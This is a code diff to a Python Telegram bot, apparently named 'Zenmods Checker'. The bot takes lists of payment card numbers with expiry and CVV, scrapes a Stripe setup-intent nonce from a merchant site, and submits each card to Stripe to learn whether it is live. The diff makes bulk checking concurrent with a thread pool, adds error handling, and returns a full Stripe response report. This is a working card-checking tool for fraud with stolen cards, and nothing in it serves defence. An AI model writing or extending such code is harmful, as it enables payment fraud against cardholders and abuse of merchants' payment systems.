@@ -1,8 +1,11 @@
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime, timedelta
+import io
 import os
 import random
 import re
 import string
+import threading
 import time
 from bs4 import BeautifulSoup
 import requests
@@ -13,6 +16,7 @@ SECRET_CODE = "Zenmods123"
 authorized_users = set()
 
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="Markdown")
+print_lock = threading.Lock()
 
 
 def create_session():
@@ -68,12 +72,18 @@ def create_session():
         return None
 
 
-def check_single_cc(cc_line, session):
+def check_single_cc(cc_line):
+    session = create_session()
+    if not session:
+        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nError: Session creation failed"
+
     try:
         card = cc_line.replace("/", "|")
         lista = card.split("|")
         if len(lista) < 4:
-            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nError: Invalid format"
+            return (
+                f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nError: Invalid format"
+            )
         cc = lista[0]
         mm = lista[1]
         yy = lista[2]
@@ -98,9 +108,12 @@ def check_single_cc(cc_line, session):
             timeout=20,
         )
         html = response.text
-        nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html).group(
-            1
+        nonce_match = re.search(
+            r'createAndConfirmSetupIntentNonce":"([^"]+)"', html
         )
+        if not nonce_match:
+            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: Nonce extraction failed"
+        nonce = nonce_match.group(1)
 
         headers_stripe = {
             "authority": "api.stripe.com",
@@ -181,79 +194,82 @@ def process_bulk_file(chat_id, file_content):
     total_cards = len(lines)
 
     if total_cards == 0:
-        bot.send_message(chat_id, "⚠️ ফাইলটি খালি রয়েছে বা কোনো কার্ড পাওয়া যায়নি!")
+        bot.send_message(chat_id, "⚠️ File is empty or no cards found!")
         return
 
     msg = bot.send_message(
         chat_id,
-        f"⚡ **Zenmods Bulk Engine** ⚡\nTotal cards found: `{total_cards}`.\n🔄 Initializing sequential check...",
+        f"⚡ **Zenmods Advanced Engine** ⚡\nTotal cards found: `{total_cards}`.\n🚀 Initializing multi-threaded check...",
     )
     msg_id = msg.message_id
-
-    session = create_session()
-    if not session:
-        bot.send_message(chat_id, "Failed to create session for bulk check.")
-        return
 
     approved_count = 0
     ccn_count = 0
     declined_count = 0
     error_count = 0
 
-    avg_time_per_card = 4
-    start_time = time.time()
+    detailed_results = []
+    completed = 0
 
-    for idx, card_line in enumerate(lines, 1):
-        elapsed = time.time() - start_time
-        avg_time = elapsed / idx if idx > 1 else avg_time_per_card
-        remaining_cards = total_cards - idx + 1
-        est_remaining_sec = int(avg_time * remaining_cards)
+    def worker(card_line):
+        nonlocal completed, approved_count, ccn_count, declined_count, error_count
+        res = check_single_cc(card_line)
+        with print_lock:
+            completed += 1
+            detailed_results.append(res)
+            if "Approved ✅" in res:
+                approved_count += 1
+                zenmods_animation = (
+                    "🌟✨💫 **Z E N M O D S   H I T !** 💫✨🌟\n"
+                    "🔥 *The anvil rings true, a legendary strike!* 🔥\n\n"
+                    f"{res}\n\n"
+                    "🎇🎆🎇🎆🎇🎆🎇🎆"
+                )
+                bot.send_message(chat_id, zenmods_animation)
+            elif "CCN ✅" in res:
+                ccn_count += 1
+                bot.send_message(chat_id, res)
+            elif "Declined ❌" in res:
+                declined_count += 1
+            else:
+                error_count += 1
 
-        progress_text = (
-            f"⚡ **Zenmods Bulk Engine** ⚡\n"
-            f"Progress: `[{idx}/{total_cards}]` ({int((idx/total_cards)*100)}%)\n"
-            f"⏳ Estimated Time Remaining: `{est_remaining_sec}s`\n"
-            f"Processing current card strictly one by one..."
-        )
-        try:
-            bot.edit_message_text(progress_text, chat_id, msg_id)
-        except Exception:
-            pass
+            if completed % 3 == 0 or completed == total_cards:
+                progress_text = (
+                    f"⚡ **Zenmods Advanced Engine** ⚡\n"
+                    f"Progress: `[{completed}/{total_cards}]` ({int((completed/total_cards)*100)}%)\n"
+                    f"Processing cards concurrently..."
+                )
+                try:
+                    bot.edit_message_text(progress_text, chat_id, msg_id)
+                except Exception:
+                    pass
 
-        result = check_single_cc(card_line, session)
-
-        if "Approved ✅" in result:
-            approved_count += 1
-            zenmods_animation = (
-                "🌟✨💫 **Z E N M O D S   H I T !** 💫✨🌟\n"
-                "🔥 *The anvil rings true, a legendary strike!* 🔥\n\n"
-                f"{result}\n\n"
-                "🎇🎆🎇🎆🎇🎆🎇🎆"
-            )
-            bot.send_message(chat_id, zenmods_animation)
-        elif "CCN ✅" in result:
-            ccn_count += 1
-            bot.send_message(chat_id, result)
-        elif "Declined ❌" in result:
-            declined_count += 1
-        else:
-            error_count += 1
-
-        time.sleep(1)
+    with ThreadPoolExecutor(max_workers=3) as executor:
+        executor.map(worker, lines)
 
     report = (
-        f"📊 **ZENMODS BULK CHECK REPORT** 📊\n\n"
+        f"📊 **ZENMODS ADVANCED CHECK REPORT** 📊\n\n"
         f"Total Checked: `{total_cards}`\n"
         f"Approved ✅: `{approved_count}`\n"
         f"CCN ✅: `{ccn_count}`\n"
         f"Declined ❌: `{declined_count}`\n"
         f"Errors/Invalid: `{error_count}`\n\n"
-        f"🏁 Bulk checking completed successfully!"
+        f"🏁 Advanced checking completed successfully!"
     )
     bot.send_message(chat_id, report)
 
+    file_data = "\n\n".join(detailed_results)
+    file_bytes = io.BytesIO(file_data.encode("utf-8"))
+    file_bytes.name = "Zenmods_Detailed_Stripe_Report.txt"
+    bot.send_document(
+        chat_id,
+        file_bytes,
+        caption="📁 Full Stripe API Response & Error Report",
+    )
 
-@bot.message_handler(func=lambda message: True, content_types=['text', 'document'])
+
+@bot.message_handler(func=lambda message: True, content_types=["text", "document"])
 def handle_messages(message):
     chat_id = message.chat.id
     text = message.text.strip() if message.text else ""
@@ -263,12 +279,12 @@ def handle_messages(message):
             authorized_users.add(chat_id)
             bot.send_message(
                 chat_id,
-                "⚡ **Zenmods Checker** ⚡\nAccess Granted! ✅\nএখন তুমি বট ব্যবহার করতে পারবে।\nকার্ড চেক করতে `/check card|mm|yy|cvv` অথবা যেকোনো `.txt` ফাইল পাঠাও!",
+                "⚡ **Zenmods Checker** ⚡\nAccess Granted! ✅\nEkhon tumi bot use korte parbe.",
             )
         else:
             bot.send_message(
                 chat_id,
-                "🔒 **Zenmods Checker** 🔒\nAccess Denied! ❌\nএই বট ব্যবহার করতে হলে প্রথমে সঠিক সিক্রেট কোডটি দিন:",
+                "🔒 **Zenmods Checker** 🔒\nAccess Denied! ❌\nSothik secret code din:",
             )
         return
 
@@ -278,44 +294,42 @@ def handle_messages(message):
         if file_name.endswith(".txt"):
             file_info = bot.get_file(doc.file_id)
             file_content = bot.download_file(file_info.file_path)
-            process_bulk_file(chat_id, file_content)
+            threading.Thread(
+                target=process_bulk_file, args=(chat_id, file_content)
+            ).start()
         else:
-            bot.send_message(chat_id, "⚠️ শুধুমাত্র `.txt` ফরম্যাটের ফাইল আপলোড করো!")
+            bot.send_message(chat_id, "⚠️ Sudhu `.txt` format er file upload koro!")
         return
 
     if text.startswith("/check"):
         parts = text.split(" ", 1)
         if len(parts) > 1:
             cc_line = parts[1].strip()
-            bot.send_message(chat_id, "⌛ Checking your card sequentially via Zenmods Engine...")
-            session = create_session()
-            if session:
-                result = check_single_cc(cc_line, session)
-                if "Approved ✅" in result:
-                    zenmods_animation = (
-                        "🌟✨💫 **Z E N M O D S   H I T !** 💫✨🌟\n"
-                        "🔥 *The anvil rings true, a legendary strike!* 🔥\n\n"
-                        f"{result}\n\n"
-                        "🎇🎆🎇🎆🎇🎆🎇🎆"
-                    )
-                    bot.send_message(chat_id, zenmods_animation)
-                else:
-                    bot.send_message(chat_id, result)
+            bot.send_message(chat_id, "⌛ Checking your card via Advanced Engine...")
+            result = check_single_cc(cc_line)
+            if "Approved ✅" in result:
+                zenmods_animation = (
+                    "🌟✨💫 **Z E N M O D S   H I T !** 💫✨🌟\n"
+                    "🔥 *The anvil rings true, a legendary strike!* 🔥\n\n"
+                    f"{result}\n\n"
+                    "🎇🎆🎇🎆🎇🎆🎇🎆"
+                )
+                bot.send_message(chat_id, zenmods_animation)
             else:
-                bot.send_message(chat_id, "Failed to create session.")
+                bot.send_message(chat_id, result)
         else:
             bot.send_message(
                 chat_id,
-                "⚠️ সঠিক ফরম্যাট ব্যবহার করো:\n`/check 4532XXXXXXXXXXXX|08|28|123`",
+                "⚠️ Sothik format use koro:\n`/check 4532XXXXXXXXXXXX|08|28|123`",
             )
     elif text == "/start":
         bot.send_message(
             chat_id,
-            "⚡ **Zenmods Checker Bot** ⚡\nYou are already authorized! ✅\nSend single card via `/check` or upload your `.txt` card list file.",
+            "⚡ **Zenmods Checker Bot** ⚡\nYou are already authorized! ✅",
         )
 
 
 if __name__ == "__main__":
     bot.remove_webhook()
-    print("Bot is listening for messages via Polling...")
+    print("Advanced Bot is listening via Polling...")
     bot.infinity_polling()
